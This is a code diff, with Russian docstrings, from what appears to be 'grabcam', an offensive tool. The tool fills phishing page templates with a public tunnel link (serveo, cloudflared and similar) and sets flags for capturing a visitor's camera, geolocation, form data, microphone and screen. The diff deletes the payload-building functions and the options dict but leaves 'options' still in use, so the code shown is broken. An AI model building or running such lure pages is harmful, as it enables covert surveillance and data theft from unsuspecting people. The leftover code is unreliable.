@@ -442,72 +442,6 @@ def _worker_cloudflared():
                     pass
 
 
-def _get_features_json() -> str:
-    """Читает options.json и возвращает JSON-строку для подстановки GRABCAM_FEATURES_JSON."""
-    import json
-    features = dict(_DEFAULT_FEATURES)
-    if os.path.isfile(_OPTIONS_FILE):
-        try:
-            with open(_OPTIONS_FILE, "r", encoding="utf-8") as f:
-                data = json.load(f)
-            for k in features:
-                if k in data and isinstance(data[k], bool):
-                    features[k] = data[k]
-        except (OSError, ValueError):
-            pass
-    return json.dumps(features, ensure_ascii=False)
-
-
-def _refresh_payload(link: str = "http://127.0.0.1:3333") -> None:
-    """Обновляет index2.html и index.html из grabcam.html — одна ссылка (/) отдаёт страницу с формой и камерой."""
-    html_tpl = os.path.join(_GRABCAM_DIR, "grabcam.html")
-    index2 = os.path.join(_GRABCAM_DIR, "index2.html")
-    index_main = os.path.join(_GRABCAM_DIR, "index.html")
-    if not os.path.isfile(html_tpl):
-        return
-    try:
-        with open(html_tpl, "r", encoding="utf-8", errors="replace") as f:
-            content = f.read()
-        content = content.replace("forwarding_link", link).replace("GRABCAM_FEATURES_JSON", _get_features_json())
-        with open(index2, "w", encoding="utf-8") as f:
-            f.write(content)
-        with open(index_main, "w", encoding="utf-8") as f:
-            f.write(content)
-    except OSError:
-        pass
-
-
-def _ensure_serveo_payload_ready() -> None:
-    """Создаёт/обновляет index2.html и index.php с плейсхолдером и текущими опциями."""
-    port = _state.get("php_port") or _PHP_PORT
-    _refresh_payload(f"http://127.0.0.1:{port}")
-    tpl_php = os.path.join(_GRABCAM_DIR, "template.php")
-    index_php = os.path.join(_GRABCAM_DIR, "index.php")
-    if os.path.isfile(tpl_php):
-        try:
-            with open(tpl_php, "r", encoding="utf-8", errors="replace") as f:
-                content = f.read().replace("forwarding_link", f"http://127.0.0.1:{port}")
-            with open(index_php, "w", encoding="utf-8") as f:
-                f.write(content)
-        except OSError:
-            pass
-
-
-def _update_serveo_payload_link(link: str) -> None:
-    """Подставляет полученную ссылку туннеля в index2.html, index.html и index.php."""
-    _refresh_payload(link)
-    tpl_php = os.path.join(_GRABCAM_DIR, "template.php")
-    index_php = os.path.join(_GRABCAM_DIR, "index.php")
-    if os.path.isfile(tpl_php):
-        try:
-            with open(tpl_php, "r", encoding="utf-8", errors="replace") as f:
-                content = f.read().replace("forwarding_link", link)
-            with open(index_php, "w", encoding="utf-8") as f:
-                f.write(content)
-        except OSError:
-            pass
-
-
 def _worker_php_only(port: int = _PHP_PORT):
     """Только PHP-сервер в папке grabcam."""
     with _lock:
@@ -557,14 +491,6 @@ class ToolGrabcam(ToolBase):
         method = (params.get("method") or "php_only").strip().lower()
         if method not in ("serveo", "php_only", "localhost_run", "cloudflared"):
             method = "php_only"
-        options = {
-            "camera": bool(params.get("camera", True)),
-            "geo": bool(params.get("geo", True)),
-            "form": bool(params.get("form", True)),
-            "gallery": bool(params.get("gallery", False)),
-            "mic": bool(params.get("mic", False)),
-            "screen": bool(params.get("screen", False)),
-        }
         try:
             with open(_OPTIONS_FILE, "w", encoding="utf-8") as f:
                 json.dump(options, f, ensure_ascii=False, indent=2)
